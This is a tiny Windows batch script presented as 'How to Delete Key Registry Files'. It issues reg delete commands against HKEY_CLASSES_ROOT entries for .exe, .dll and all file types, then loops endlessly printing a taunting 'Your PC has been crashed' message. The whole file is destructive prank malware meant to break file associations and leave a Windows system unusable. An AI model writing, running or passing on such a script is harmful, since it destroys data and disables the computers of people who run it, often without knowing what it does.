#How to Delete Key Registry Files
@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your PC has been crashed. Your Dad.
GOTO MESSAGE




